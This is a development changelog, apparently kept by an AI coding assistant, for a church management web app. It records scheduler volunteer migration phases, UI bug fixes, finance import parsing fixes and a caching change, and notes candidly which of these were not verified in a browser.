- **`getPeople()`/`savePeople()` stay untouched** — still a plain synchronous localStorage array. This was the key design constraint: `getPeople()` is called from dozens of places across the ~4,800-line scheduler script (schedule generation, Focus Week, stats, reminders...), and turning it async to talk to a real API directly would have meant touching every single call site — the opposite of "methodically." Instead, new `syncRelationalVolunteers()` runs once per data pull (`d1Pull()`), fetches `/admin/api/scheduler/volunteers`, and merges each relational row into the same `ws_people` array shape everything already expects — so every other reader in the file needed zero changes.
- **Critical correctness detail**: a migrated relational row keeps its *original legacy id* (`migrated_from_legacy_id` from Phase 2) as its merged `id`, not a freshly-derived one — otherwise every past schedule/history/last-served reference to that volunteer (which are all just stored `id` strings) would silently orphan the moment someone got migrated. A brand-new relational-only volunteer (added directly through this new flow, never existed in the old system) gets a derived `'p' + person_id` id instead. Verified with a Node harness that runs the actual served script (extracted from the real `SCHEDULER_HTML` build, not a hand re-implementation) with a fake `fetch`/`localStorage`, confirming a migrated entry supersedes its stale legacy copy under the same id while an unmigrated legacy volunteer passes through untouched.
- **Add/Edit Person panel**: the old "Search Breeze to Import" box is replaced with "Search ChMS People", hitting the same internal `GET /admin/api/people?q=` endpoint the rest of the admin app already uses (Households/Reports/Tuition Aid's `acSearch()`) — no Breeze round-trip to find someone, per the explicit request. Adding a brand-new volunteer now requires linking a real person first (the old freeform name+email typing is gone for new adds); editing an already-linked volunteer shows their name read-only with a "Link to a different person" toggle for the rare re-link case, and editing a not-yet-migrated legacy volunteer works exactly as it always did (search box front-and-center, freeform name/email, no forced migration). Saving a linked volunteer POSTs/upserts straight to `/admin/api/scheduler/volunteers`; deleting one also soft-deletes their `scheduler_volunteers` row (the underlying `people` record is never touched).
- Removed now-dead `importBreezePersonToForm()`, `tagsToRoles()`, `deepFindEmail()` — these existed only to support the single-person Breeze-import flow just replaced; confirmed zero other callers (the bulk `syncToBreeze()` roster sync and `breezeGet()` client are untouched, they're a separate feature).
- **Deliberately out of scope for this slice**: no "create a brand-new People record directly from the Scheduler form" — if someone doesn't exist in ChMS yet, add them via the People tab first, then link them here (Phase 2's migration tool already has its own "create new person" action for the bulk case). No changes yet to Focus Week, schedule generation, reminders, or any other Scheduler surface — those still read the merged `ws_people` array exactly as before, which is what makes this phase safe to ship without touching them.
- `scheduler/index.html` resynced (SC5 process). `node --check` on the extracted `<script>` block from both the standalone and embedded (`getSchedulerInline()`) builds, `npm test` (103/103, unchanged — this phase has no new backend surface, Phase 1/2's API is reused as-is). **Not verified**: an actual browser — same standing gap as every Scheduler change in this environment; this phase in particular touches the most-used part of the admin surface (adding/editing volunteers), so a careful first real click-through is worth prioritizing.
- (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-20 (v1.38.0 — People: middle name + preferred name fields; Households: hyphenated-name helper)
User request: People tab was missing middle name and preferred/goes-by name fields; also wanted a way to build hyphenated household last names for spouses who each keep their own surname.
- New `people.middle_name` / `people.preferred_name` TEXT columns (migration `0021_person_middle_preferred_name.sql` + `db.js` runtime safety net). Wired through `POST /people` (create), `PUT /people/:id` (full update + its audit-field diff list), and the sparse `PATCH /people/:id` allowlist — same 3-endpoint pattern as every other person field. `preferred_name` also added to the people-list search clause (`q=` now matches against it too).
- Person edit modal (`html-tabs.js`/`js-people.js`): new "Middle Name" / "Preferred Name (goes by)" row under First/Last Name, hidden for Organization-type records same as the existing name fields.
- Person profile header (`showProfile()`) now renders `First "Preferred" Last` when a preferred name is set; both fields also show as read-only rows in the Demographics section (edit via the full person modal, not inline — consistent with other name-shaped fields that aren't in `pvEditDemo`'s scope).
- Households: since `households.name` was already free text with no format constraints, no schema change was needed for hyphenation itself — added a "Hyphenate from members' last names" button to the household edit modal (shown only when the household's members have 2+ distinct last names) that fills the Family Name field with `LastName1-LastName2 Family` from the household's actual member last names, so staff don't have to type it by hand or guess the convention.
- `npm test` (94/94), `node --check` on all touched files and both built `CHMS_APP_CORE_JS`/`CHMS_APP_EXT_JS` bundles. Not verified in a live browser.

---
### 2026-07-20 (SC6 Phase 2 — v1.38.0 — Scheduler volunteer migration/reconciliation tool)
Second slice of relationalizing Scheduler volunteers onto real ChMS `people` rows (see Phase 1 below). This phase builds the actual migration tool — nothing in the live Scheduler UI changes yet, but this is the first native-UI surface for the migration, and admin/staff can now use it to start linking real legacy volunteers.
- New migration `0021_scheduler_volunteers_legacy_id.sql`: adds `migrated_from_legacy_id` to `scheduler_volunteers`, tracking which old `ws_people` client-side id a row came from (set once on initial insert, never touched again — so a later manual edit through the plain CRUD endpoint can't accidentally erase provenance). Indexed so the preview endpoint can cheaply exclude already-migrated legacy volunteers on repeat visits.
- New matching logic in `src/api-scheduler.js`: `matchLegacyVolunteer(legacy, people)` tries, in order, an exact Breeze-ID match, then an exact first+last name match, then a fuzzy last-name-or-email match — and deliberately returns `suggested: null` (forcing a human decision) whenever more than one real person could plausibly match, rather than guessing. Exercised directly against the real "two different people named John Hawkins" scenario documented elsewhere in this app's history (TAP12) to confirm ambiguous matches are flagged, not silently picked.
- Two new endpoints: `GET /admin/api/scheduler/volunteers/migration-preview` (reads the legacy `scheduler_data` blob, returns each not-yet-migrated volunteer with its suggested match) and `POST /admin/api/scheduler/volunteers/migration-commit` (`{ mappings: [{legacy_id, action: 'link'|'create'|'skip', person_id?}] }`). The commit endpoint deliberately re-reads roles/preferences/etc. from the legacy blob itself server-side rather than trusting anything in the request body beyond the per-row decision — a client can only choose *who* to link to, never *what* gets written. Refuses (with a per-row error, not a silent overwrite) to link two different legacy volunteers to the same real person.
- New Settings → Import/Export card "Migrate Scheduler Volunteers to People": loads the preview, shows each legacy volunteer with its suggested match pre-selected (or "Create a new person" pre-selected when nothing matched), lets the admin instead search for a different person (reusing the same internal People search used everywhere else in the app) or skip, then commits all reviewed rows in one request and reports linked/created/skipped/error counts.
- 9 new tests (26 total scheduler-volunteer tests now) covering: Breeze-ID match takes priority over name match, exact-name fallback, ambiguous-name flags without guessing, no-match reporting, already-migrated exclusion from the preview, commit uses the legacy blob's own data (not client-supplied data), commit creates a new person when requested, skip action, and the same-person-double-link refusal. `npm test` (103/103), `node --check` on all touched files plus the fully-assembled `CHMS_APP_CORE_JS`/`CHMS_APP_EXT_JS` (not just the source template files, which are `String.raw` wrappers that `node --check` alone would not catch template-content errors in). `DEPLOY_VERSION` bumped to 1.38.0 (this phase touches the frontend, unlike Phase 1).
- **Deliberately not done yet**: no bulk "auto-link everything with a Breeze ID match" shortcut (every row, even an obvious match, still requires a human click, per the user's "methodically and slowly" instruction) — reconsider once real usage shows that's excessive friction. No frontend wiring of the live Scheduler UI to `scheduler_volunteers` yet — that's Phase 3.
- (`migrations/0021_scheduler_volunteers_legacy_id.sql`, `src/db.js`, `src/api-scheduler.js`, `src/frontend/js-export-import.js`, `src/frontend/html-tabs.js`, `test/scheduler-volunteers.test.js`)

### 2026-07-20 (SC6 Phase 1 — Scheduler native-rewrite: relational `scheduler_volunteers` table + backend API)
Following the three round-trip Scheduler-embed bugs earlier today (SC3-BUG1/SC3-BUG2-class issues recurring, most recently the role-picker CSS-scoping miss), the user revisited SC6 (native Scheduler rewrite, previously declined 2026-07-15) and asked for a full feature/risk inventory before deciding. A read-only agent pass over `src/scheduler-html.js` (~5,900 lines) and `src/scheduler-inline.js` found the single highest-leverage decision wasn't the embed-transform risk (real, ~24 separate regex/string-literal rules, but containable) — it was the **storage model**: Scheduler's admin-side data (people, monthly schedule, confirmations, history) lives entirely in `localStorage`, synced to a single D1 key/value blob table (`scheduler_data`, whole-snapshot round-trip on every save), and "Scheduler people" have client-generated string ids (`makeId()`) completely disconnected from ChMS's real numeric `people.id` — they are not the same records, and nothing today maps one to the other except the separate (already-relational) public volunteer `signups.person_id` link.
User's decision: **do relationalize** — a Scheduler volunteer should be a real ChMS `people` row, and volunteer search should query the internal database directly (no Breeze dependency for this, unlike the current `breezeGet`/`importBreezePersonToForm` flow). Requested explicitly methodical/incremental delivery, not a single big-bang rewrite.
**Phase 1 (this slice, additive-only — no existing Scheduler behavior changed, nothing wired to the frontend yet):**
- New table `scheduler_volunteers` (migration `0020_scheduler_volunteers.sql` + `db.js` runtime safety net): `person_id INTEGER PRIMARY KEY REFERENCES people(id)` — one row per real person who is a Scheduler volunteer — plus `reminder_email` (optional override, blank = fall back to `people.email`), `roles`/`primary_for`/`preferred_sundays`/`role_sunday_overrides`/`blackout_dates` (JSON columns, same shape as today's `ws_people` fields), `service_preference`, `absence_start`/`absence_until`, and an `active` flag (soft-delete — removes from the volunteer pool but keeps the row so future schedule-history rows keyed by `person_id` never orphan).
- New `handleSchedulerVolunteersApi()` in `src/api-scheduler.js`: `GET /admin/api/scheduler/volunteers` (list, `?active=all` to include soft-deleted), `POST` (create-or-upsert-and-reactivate by `person_id`, validates the person exists first), `PATCH /:personId` (sparse update, only touches fields present in the body — same pattern as the ChMS People sparse-PATCH from FH6), `DELETE /:personId` (soft delete). Same `admin`/`staff` role guard as the rest of the scheduler admin surface (SW1). Wired into `api-admin.js`'s dispatch ahead of the generic `scheduler/` blob-store route so it doesn't get swallowed by it.
- **No new search endpoint needed** — volunteer search/linking will reuse the existing `GET /admin/api/people?q=` endpoint the same way Households/Reports/Tuition Aid's `acSearch()` already does, which is exactly "search internal DB instead of Breeze" as requested.
- New `test/scheduler-volunteers.test.js` (8 cases, real SQL via `node:sqlite` + the migration file, same harness pattern as `test/finance-church.test.js`): auth guard, create+list, reject-nonexistent-person, upsert-not-duplicate on re-POST, sparse PATCH preserves untouched fields, 404 on PATCH/DELETE for an unlinked person, soft-delete excludes from default list but is visible via `?active=all`. `npm test` (94/94), `node --check` on all touched files.
- **Deliberately not done yet** (future phases): no data migration of existing `ws_people` rows into this table; no frontend wiring (Scheduler UI still reads/writes `localStorage`/`scheduler_data` exactly as before — this phase is purely additive backend plumbing); no UI for searching/linking a volunteer to a person. Next phase should be a migration/reconciliation tool (match existing scheduler people to real `people` rows via `breezePersonId → people.breeze_id` or name match, surfaced for manual review before committing — same pattern as the existing duplicate-fund-merge and person-match-suggestion tools elsewhere in this app) before any frontend cutover.
- (`migrations/0020_scheduler_volunteers.sql`, `src/db.js`, `src/api-scheduler.js`, `src/api-admin.js`, `test/scheduler-volunteers.test.js`)

### 2026-07-20 (v1.37.2 — Bug fix: role picker still didn't open in the actual embedded Scheduler tab)
The v1.36.2/v1.37.1 fixes were verified against `src/scheduler-html.js`'s standalone output, but the app is actually used embedded inside the ChMS SPA (`chms.timothystl.org/chms#scheduler`), assembled by `src/scheduler-inline.js` (SC2) — a distinct code path this session hadn't checked. That file scopes every one of the scheduler's CSS selectors under a `.sched-root` wrapper it wraps the markup in (`_scopeCss`/`_prefixSelectors`), so `.role-picker`'s styles are actually served as `.sched-root .role-picker { ... }`. Appending the popover straight to `document.body` (v1.36.2's fix for the `.fw-layout` clipping bug) put it *outside* `.sched-root` in the embedded app — so in production, the popover had zero CSS applied: no `position:fixed`, no sizing, nothing, making it either invisible or landing wherever unstyled block flow put it. This is why the fix appeared to do nothing for the user even after a follow-up attempt that only tested the un-embedded code path.
- Fixed by appending the popover to `document.querySelector('.sched-root') || document.body` instead of unconditionally `document.body` — inside `.sched-root` when embedded (so the scoped stylesheet still applies), falling back to `document.body` for the standalone (now-retired, see RD3) `/scheduler` route which has no such wrapper.
- **Verification gap this time closed properly**: ran the actual `getSchedulerInline()` transform (not just `SCHEDULER_HTML` directly) and confirmed the produced `<style>` block contains `.sched-root .role-picker { position:fixed; ... }` and the produced `<script>` block references `document.querySelector('.sched-root')` — i.e. checked the real code path the live app uses, not just the source file. `node --check` on both the standalone and embedded transformed script, `npm test` (86/86).
- **Not verified**: an actual browser — this remains the standing gap for every Scheduler change in this environment, and is exactly the kind of thing this bug shows is worth escalating to a real click-through once deployed, rather than assuming a source-level fix is sufficient for a feature with an embed-time transform step.
- (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-20 (v1.37.1 — Bug fix: role picker regression — clicking a role row did nothing)
Immediate regression from the previous fix (v1.36.2, which moved the role picker popover to `position:fixed`/appended-to-`document.body` to stop it being clipped by `.fw-layout`'s `overflow:hidden`). That fix also added `window.addEventListener('scroll', closeRolePicker, true)` so the popup wouldn't drift out of position if the page scrolled — but a clicked `<button>` gaining focus can itself trigger the browser to auto-scroll it into view, firing a `scroll` event a moment after the click, which the capturing listener caught and closed the picker that had just opened — same tick, no visible flash, just "clicking does nothing."
- Fixed by repositioning the open picker on scroll/resize instead of closing it (new `repositionOrCloseRolePicker()`, tracking the currently-open anchor row in `openRolePickerAnchor`) — only actually closes if the anchor row is no longer attached to the DOM (i.e. the panel was re-rendered out from under it), which is the one case a reposition can't recover from.
- Also added a `closeRolePicker()` call at the top of `renderFocusWeekDetail()` itself, since every re-render replaces all `.role-row-wrap` elements — closing there directly instead of relying on the scroll/resize fallback to eventually notice.
- Verified by re-tracing every call path that re-renders the Focus Week detail pane (rail navigation, `cycleConfirmation`, and `assignRoleSlot` → `renderTable()` → `renderFocusWeek()` → `renderFocusWeekDetail()`) to confirm the picker is always closed before its anchor becomes stale, not just "eventually" on the next scroll. `scheduler/index.html` resynced, `node --check`, `npm test` (86/86). **Not verified**: an actual browser. (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-20 (v1.37.0 — Scheduler: fix cross-role double-booking + broken Service Preference selector)
User reported two things while editing a volunteer (Frank Kohn, who can fill both PowerPoint and Lector): (1) people were "often" showing up scheduled for two different roles (e.g. Lector and PowerPoint) at what turned out to be the same service — should be impossible; (2) the "Service Preference" (Both Services / 8:00 AM only / 10:45 AM only) buttons in the edit-person modal didn't visibly respond to clicks at all, making it look impossible to set. A third question ("he can do Lector on any Sunday, how do I select that") turned out to already work — leaving a role's row blank in the "Customize Sundays per role" table already means "any Sunday" (falls back to the global Preferred Sundays setting, which was also blank = any) — but the UI gave no visible confirmation of that, which is exactly what made it look broken/unset.
- **Real scheduling bug (`generateSchedule()`/`autoFillSchedule()`)**: each of the 5 per-service roles (Elder/Acolyte/PowerPoint/Lector/Liturgist) picked its volunteer independently, only avoiding repeating the *same* person within the *same* role across the two services — nothing stopped one person being picked for two *different* roles at the identical service time, which is a real double-booking (can't physically be in two places filling two roles in the same service). Fixed by tracking a per-service (`8am`/`10:45am`) "already serving" set shared across all roles for that Sunday — populated as shared roles (Preacher/Children's Message, which cover both services) are assigned, then checked/updated as each per-service role is filled — so nobody is ever picked twice for the same service slot. `autoFillSchedule()` got the same fix, seeded from whatever's already filled in a row (manual assignments or a prior fill pass) before adding new ones. Verified with a standalone Node harness reproducing the exact reported scenario (a 2-person pool where one person can fill both roles) — confirms the shared person now lands in different roles across the two *different* services instead of both roles at the same service.
- **Real UI bug**: the Service Preference radio buttons visually never showed a selection, in both the Add and Edit person flows — clicking them appeared to do nothing. Root cause was two compounding bugs: (1) `.radio-group label` had its native radio hidden (`opacity:0`) same as the checkbox-pill pattern used elsewhere in this modal, but unlike `.checkbox-group label.checked`, there was no `.radio-group label.checked` CSS rule at all to show the selected state; (2) the `syncLabels()` helper that applies the `.checked` class only ever queried `input[type="checkbox"]`, so even calling it on the Service Preference group would silently do nothing — and it was never even called for that group (`clearForm()`/`editPerson()` only synced `pref-sundays`/`pref-roles`/`primary-roles`). The underlying radio value itself was being set/saved correctly the whole time; only the visual feedback was missing, but with zero visual feedback the control looked non-functional. Fixed: added the missing CSS rule, widened `syncLabels()` to also match `input[type="radio"]`, added a `change` listener for the Service Preference group, and added it to the existing sync calls in both `clearForm()` and `editPerson()`.
- **UX clarity for "any Sunday" per role**: `buildRoleOverrideTable()` now shows a small "(any Sunday)" note under a role's name whenever that role's row has no Sundays checked, live-updating as boxes are (un)checked — makes the existing "leave it blank" behavior visible instead of looking unset.
- `scheduler/index.html` resynced (SC5 process). `node --check` on the extracted `<script>` block, `npm test` (86/86). **Not verified**: an actual browser — same standing gap as every Scheduler change in this environment.
- (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-20 (v1.36.2 — Bug fix: Scheduler role picker clipped/unscrollable on the last role of a week)
User reported that on the Scheduler's Focus Week view, when editing the role picker for the last role row in a week's detail pane, the popover's name list couldn't be scrolled through — some names at the bottom were unreachable. Root cause: `.role-picker` was `position:absolute` inside `.role-row-wrap`, itself nested inside `.fw-layout`, which has `overflow:hidden` (used to round the corners of the week-rail/detail split). For a role row near the bottom of the pane, the popover (which opens downward, `top:100%`) extended past `.fw-layout`'s bottom edge and got hard-clipped there — the popover's own internal scrollbar was real, but part of its content (and scroll area) was cut off by the ancestor's `overflow:hidden`, not by the popover's own `max-height`.
- Fixed by appending the picker to `document.body` as `position:fixed` instead of as a child of the role row, with its position computed from the anchor row's `getBoundingClientRect()` (new `positionRolePicker()` helper) — this puts it outside any ancestor's clipping box entirely.
- Added a flip: if there isn't enough room below the row in the viewport (and there's more room above), the picker opens upward instead, with its `max-height` capped to whichever side has more room — so it's never clipped by the browser viewport either, only by its own scrollbar.
- Since the popover is no longer re-parented under the row, closes it on any `scroll` (capture-phase, so it catches scrolling in any ancestor container) or `resize` event rather than trying to reposition live — matches the existing click-outside-to-close behavior already in place.
- `scheduler/index.html` resynced (evaluated `SCHEDULER_HTML` through its module and wrote the result verbatim, per the SC5 process) since this touched `src/scheduler-html.js`. `node --check` on the extracted `<script>` block, `npm test` (86/86). **Not verified**: an actual browser — this environment has no live browser to click through the Focus Week view. (`src/scheduler-html.js`, `scheduler/index.html`)

### 2026-07-20 (v1.36.1 — Bug fix: Balance Sheet import silently read every account as $0)
User reported importing a real "Balance Sheet without zero acct" export and every line item came back $0. Traced directly against the real re-uploaded file: this particular QuickBooks export writes each leaf account's actual dollar amount as **plain text inside the `<f>` (formula) tag** — e.g. `<f>115605.47</f><v>0.0</v>` — with the cached `<v>` stuck at a stale `0.0` that was never recalculated before the file was saved (real subtotal rows have genuine cell-reference formulas like `<f>(B10)+(B11)</f>`, also with a stale `<v>0.0</v>`, but those rows are already discarded/re-derived by `parseBalanceSheetGrid()` so it doesn't matter that their cached total is wrong). `finXlsxParseSheetGrid()` previously only ever read `<v>`, so every leaf account silently imported as $0 with no error — a "ran successfully but wrong" bug, not a crash.
- Fixed: for a numeric cell, if its `<f>` content is a plain number (`/^-?\d+(\.\d+)?$/`), that value is used instead of the stale `<v>`; a real formula (containing cell references) falls through to the old `<v>`-based behavior unchanged.
- **Verified against the real re-uploaded file**: Assets $1,189,411.18 = Liabilities $442,632.36 + Equity $746,778.82, `balancedCents: 0` — confirmed via `parseBalanceSheetGrid()` + `computeBalanceSummary()` run directly against the actual file, not a synthetic fixture. New unit test (`finXlsxParseSheetGrid — literal-number formula cells`) reproduces the exact real-world XML pattern (literal-number `<f>`, real-formula `<f>`, and a plain `<v>`-only cell with no `<f>` at all) and asserts the correct value is read in each case. `finXlsxParseSheetGrid()` exported from `src/api-finance.js` (previously internal-only) so this could be tested directly rather than only indirectly through a full XLSX zip fixture. `npm test` (86/86), `node --check`, built-`<script>`-block check. This same fix also benefits the Budget vs. Actuals import path, which shares the same cell reader, in case a future export uses this convention there too. (`src/api-finance.js`, `test/finance-church.test.js`)

### 2026-07-19 (v1.36.0 — Daycare Sync: import last year's MDO data from an already-imported Church Budget)
Requested feature: derive historical daycare (Mother's Day Out) financial data from a Church Budget year the user has already imported (FIN6/Budget-vs-Actuals import, v1.31.0), instead of re-keying it by hand. The "MDO" category the user described maps to whichever real accounts in the Church Budget carry "MDO" or "Mother's Day Out" in their name — confirmed against the real uploaded Budget vs Actuals file that these are genuinely inconsistently numbered even within one file (`47020 MDO Tuition`, `50160 MDO Supplies`, `57160 MDO - Supplies`, `57161 MDO -  Wages` — note the double space, `57162 MDO Payroll Taxes`, `57163 Workers Comp`, `57175 MDO Payroll Processing`), so matching is name-pattern-based (`/mdo|mother'?s day out/i` against `category_path` or `account_name`), not account-number-based.
- New `classifyMdoAccountCategory()` (`src/api-finance.js`) maps a matched account's name to the Daycare Report's existing category taxonomy (`Tuition Income`/`Payroll`/`Payroll Taxes`/`Workers Comp`/`Other Payroll Expenses`, falling back to `Other Expenses`) via a small ordered regex rule list (tuition → Tuition Income, "payroll tax" → Payroll Taxes, "workers comp" → Workers Comp, "payroll processing" → Other Payroll Expenses, "wage" → Payroll).
- `extractMdoDaycareEntries(entries, year)` reads the year's already-resolved (source-precedence-applied) `finance_church_entries` rows, filters to MDO-matched accounts, and emits one `finance_daycare_entries`-shaped row per non-zero actual/budget amount, each carrying a traceable note (`"Imported from Budget vs Actuals FY2025 (57161 MDO -  Wages)"`) and `source: 'church_budget_import'`.
- `persistDaycareEntriesFromChurchBudget()` wholesale-replaces only `source='church_budget_import'` rows for the specific year being (re-)imported — manual entries and other years are untouched, same replace-scope precedent as every other import in this app.
- Two new endpoints: `GET /admin/api/finance/daycare/church-budget-preview?year=YYYY` (no DB write — returns the per-category actual/budget totals plus the individual line items for review) and `POST /admin/api/finance/daycare/church-budget-import` (`{year}`, commits).
- New "Import from Church Budget (MDO accounts)" block in the Overview tab's existing Daycare Sync card: a year input + Preview button renders a per-category summary table and an expandable full line-item list, then an "Import These N Line Items" button commits and refreshes the synced-rows table below.
- **Verification**: ran the full pipeline (classifier → extraction → persistence → both endpoints) against a real in-memory SQLite DB seeded with realistic MDO-shaped `finance_church_entries` rows, calling `handleFinanceApi()` directly for both the preview GET and commit POST — confirmed the preview's per-category totals and per-line notes match exactly, the commit response (`{ok:true, year, imported:4}`) is correct, and the resulting `finance_daycare_entries` rows match the preview exactly. New unit tests cover the classifier against the real account-name strings from the uploaded file, extraction (zero/blank-amount skipping, actual+budget pairing), and persistence (replace-not-duplicate on re-import, manual rows surviving untouched). `npm test` (85/85), `node --check` on all touched files, updated built-`<script>`-block check (3 blocks, all clean). **Not verified**: an actual browser (same standing gap as every browser-dependent feature in this app), and no live MDO Church Budget import exists yet in prod to try this against for real once deployed. (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `test/finance-church.test.js`)

### 2026-07-18 (v1.35.0 — Perf: app JS split into 2 long-cached external files, no longer inlined)
User reported the live site "finally loaded" but was heavy. Measured the actual served page: **1,266 KB uncompressed**, of which only ~57 KB (4.5%) was comments (not the real cause) — the rest was ~968 KB of genuine JS from every tab (People, Giving, Reports, Attendance, Tuition Aid, Finance, Volunteers, Settings, Scheduler, etc.), all inlined into one `<script>` block and served with `Cache-Control: no-store, no-cache, must-revalidate` — meaning **every single page load re-downloaded and re-parsed the entire app from scratch**, even a staff member reloading the same page five times in one sitting.
- Split the two inlined `<script>...</script>` blocks (previously `JS_CORE`..`JS_HOUSEHOLDS` and `JS_GIVING`..`JS_VOLUNTEERS`, the historical/arbitrary boundary from the original IN3 module split — kept exactly where it already was, on purpose, to minimize risk) into two new exported constants, `CHMS_APP_CORE_JS`/`CHMS_APP_EXT_JS` (`src/html-chms.js`), served at new routes `GET /admin/app-core.js`/`GET /admin/app-ext.js` with `Cache-Control: public, max-age=31536000, immutable` — no auth required (client-side UI code only, no secrets, same security model as the existing manifest/service-worker routes). `CHMS_HTML` itself (the per-user auth-gated shell) is unchanged — still `no-store` — but now only ~515 KB (down from 1,266 KB), referencing the two JS files via `<script src="/admin/app-core.js?v=1.35.0">`.
- `DEPLOY_VERSION` promoted from a hardcoded string inside the served script to a real `export const` at the top of `js-core.js`, interpolated into the page — this is now the cache-busting query param on both new routes, so a version bump automatically invalidates the long-lived cache with no separate step to remember (documented as a load-bearing convention in CLAUDE.md, since forgetting the bump now means a JS-only change genuinely won't reach returning visitors even though the deploy succeeds).
- `.github/scripts/check-built-scripts.js` (this app's established syntax-safety net, see SC3-BUG1) updated to `node --check` the two new external constants directly, since its `<script>...</script>` regex no longer matches `<script src="...">` tags — same total coverage as before, just reached differently.
- **Verification**: confirmed the two new constants are **byte-for-byte identical** to what the old inline blocks contained (reconstructed the pre-split concatenation from the still-unchanged individual module exports and diffed) — this is a pure relocation, zero content change, zero functional risk. Re-ran this session's established eval-both-blocks-together technique against the new file pair and confirmed every function (`esc`, `DEPLOY_VERSION`, `finExportBoardPacket`, `renderPieChart`, etc.) is still mutually visible in the same shared global scope, in the same order, as before. `npm test` (79/79), `node --check` on all touched files including the Worker entry point, updated built-script check (still reports 3 blocks, all parse clean). **Not verified**: an actual browser confirming the cache headers take effect and repeat loads are actually faster (same standing gap as every other browser-dependent change this session) — but this is a mechanical, low-risk change (moved bytes, changed no logic), so the main residual risk is Cloudflare Workers actually honoring these `Cache-Control` headers for its own dynamic responses (not R2/static assets) the way a normal origin server would — worth confirming with real browser DevTools after this deploys. (`src/frontend/js-core.js`, `src/html-chms.js`, `tlc-volunteer-worker.js`, `.github/scripts/check-built-scripts.js`)

### 2026-07-18 (v1.34.0 — Finance: Board Packet export)
New "Board Packet" card at the top of Finance → Overview: one button downloads a single JSON file bundling this year's Income Statement, Balance Sheet, 5-year trends for both, and the full daycare ledger — designed to be handed to a separate Claude session (or any analyst) each month to write the actual board finance summary, flagging anything unusual. Deliberately does zero anomaly detection or narrative generation itself — reuses the exact same server-side functions (`resolveChurchYearPrecedence`, `computeYearSummary`, `computeBalanceSummary`) the on-screen This Year/Multi-Year/Balance Sheet views already render from, so the exported numbers can never disagree with what's on screen. New `GET /admin/api/finance/board-packet?year=YYYY` endpoint.
- **Verification**: ran the actual endpoint against a real in-memory SQLite DB (seeded with Income/Expenses/Balance Sheet/giving/daycare rows) through `handleFinanceApi()` directly — confirmed every figure in the returned JSON matches the seeded data exactly (Income $1,000, Expenses $600, Net $400, giving reference $500, 5-year trend years, Balance Sheet Assets $5,000, and the daycare ledger entry verbatim). Also ran the actual served frontend's built `<script>` code (extract-and-`eval()`) with a stubbed `fetch`/`Blob`/`URL.createObjectURL` to confirm `finExportBoardPacket()` calls the right endpoint and the button correctly re-enables after completion. `npm test` (79/79, unchanged — the endpoint is orchestration over already-tested pure functions), `node --check`, built-`<script>`-block check. **Not verified**: an actual browser or a real download click. (`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`)

### 2026-07-18 (v1.33.0 — Church Report: category pie charts + Balance Sheet multi-year trend)
Requested follow-up to the Budget/Balance Sheet imports: pie charts for major income sources and expense categories, and the ability to compare Balance Sheet data across imported years.
- **Income Sources / Expense Categories pie charts** on the This Year view — new `finPieItemsFromTree()` builds pie-chart items from a classification's immediate depth-1 subcategories (e.g. "40 Donor Income", "42 Passive Income" under Income), reusing the tree `finRenderChurchThisYear()` already builds for the full-detail table below rather than rebuilding it. Zero/negative-total categories are dropped (a pie slice can't represent them) and the rest sorted largest-first; reuses the existing `renderPieChart()` helper already shared with Giving by Method.
- **Balance Sheet Asset Composition pie** — same helper, applied to the Assets classification's depth-1 subcategories (Bank Accounts, Investments, Fixed Assets, etc.).
- **Balance Sheet Multi-Year Trend** — new `finance/church/balances/multi-year` endpoint (mirrors the existing Income Statement multi-year endpoint: one bulk query + JS grouping, defaults to the last 5 calendar years) plus a grouped bar chart (Assets/Liabilities/Equity by year, reusing `renderGroupedBarChart()`) — this was the real gap flagged when asked "will this track comparisons across years": the backend already scoped each import to its own fiscal year, so nothing needed to change there, only the missing multi-year *view*.
- **Verification**: ran the actual served frontend's built `<script>` code (extract-and-`eval()`) with real-shaped Budget/Balance-Sheet data — confirmed both pie charts render, confirmed a $0 category is correctly excluded from the pie (verified directly against `finPieItemsFromTree()`, not just a substring match against the page, since the full-detail table below legitimately still lists $0 accounts), and confirmed the Balance Sheet Multi-Year Trend chart renders all three years' figures. `npm test` (79/79, unchanged — the new endpoint is thin orchestration over the already-tested `computeBalanceSummary()`), `node --check`, built-`<script>`-block check. **Not verified**: an actual browser. (`src/api-finance.js`, `src/frontend/js-finance.js`)

### 2026-07-18 (v1.32.0 — Church Report: Balance Sheet view + import)
New third view in Church Report (This Year / Multi-Year / **Balance Sheet**) plus an "Import Balance Sheet" button, using the two real files uploaded right after the Budget import shipped (v1.31.0) — a "Statement of Financial Position" export and a "Balance Sheet without zero acct" export. The user's own read was almost right ("I think they are the same report... effectively the same") — confirmed they are the same underlying QuickBooks report and the real dollar amounts genuinely do balance (Assets = Liabilities + Equity, to the cent) in the real file — but the two exports turned out to use two different formatting conventions, not just a zero-filter, so the parser was built to handle both rather than picking one:
- **"Statement of Financial Position"** carries real cell-level indent metadata (no leading spaces in the label text at all) and closes subtotals as "Total for X".
- **"Balance Sheet without zero acct"** uses literal leading spaces (same convention as the Budget vs. Actuals export) and closes subtotals as "Total X" (no "for").
- New `finXlsxParseCellXfsIndents()`/`finXlsxParseColAIndents()` read `xl/styles.xml`'s cellXfs table and each row's column-A style index — verified this regex-based extraction reproduces `openpyxl`'s parsed indent values exactly, row for row, against the real file. `parseBalanceSheetGrid()` tries the leading-space convention first, falling back to the style-indent metadata per row, so either convention (or a mix) reads correctly.
- **Real bug caught before shipping** (found by deliberately constructing a test fixture with a trailing footer line, which the real files also have): a depth-0 line with no children following it (a stray title line, or the trailing "Accrual Basis ..." timestamp footer) was getting silently mis-filed as a bogus account under whichever classification happened to be open last, rather than recognized as noise — confirmed this exact failure against the real Statement-of-Financial-Position file (it stored an "Equity:Accrual Basis Friday, July 17, 2026..." row) before fixing it with the same "depth-0-with-no-children = noise" rule already used by the Budget parser.
- The "Liabilities and Equity" combined heading (standard balance-sheet convention: Assets = Liabilities + Equity) is a non-storable grouping wrapper in both real exports — its two real children, "Liabilities" and "Equity", sit one level deeper than "Assets" in the source file's own indentation, so the parser fully resets its path stack whenever it matches a real classification (Assets/Liabilities/Equity) rather than trusting each file's literal indent number to stay consistent across classifications.
